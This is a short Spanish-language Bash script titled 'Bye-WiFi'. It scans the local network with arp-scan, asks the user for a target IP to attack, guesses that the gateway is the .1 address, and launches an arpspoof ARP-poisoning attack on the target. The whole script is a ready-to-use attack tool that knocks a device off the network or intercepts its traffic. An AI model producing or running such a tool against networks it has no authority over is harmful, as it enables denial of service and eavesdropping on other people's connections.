#!/bin/bash

cat << "EOF"
  ____                 __          ___ ______ _
 |  _ \                \ \        / (_)  ____(_)
 | |_) |_   _  ___ _____\ \  /\  / / _| |__   _
 |  _ <| | | |/ _ \______\ \/  \/ / | |  __| | |
 | |_) | |_| |  __/       \  /\  /  | | |    | |
 |____/ \__, |\___|        \/  \/   |_|_|    |_|
         __/ |     Creado Por DevCavac
        |___/
EOF

check_herramienta() {
     if ! [ -x "$(command -v $1)" ]; then 
        echo "Error: $1 no esta instalado. Por Favor, instala $1 y vuelve a intentarlo." <&2
        exit 1
     fi
}

check_herramienta "dsniff"

read -p "Inserte la interfaz de red que quieras analizar: " interfaz
arp-scan -I "$interfaz" --localnet # Agrega este comando

read -p "Inserte IP para atacar: " ip
puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"

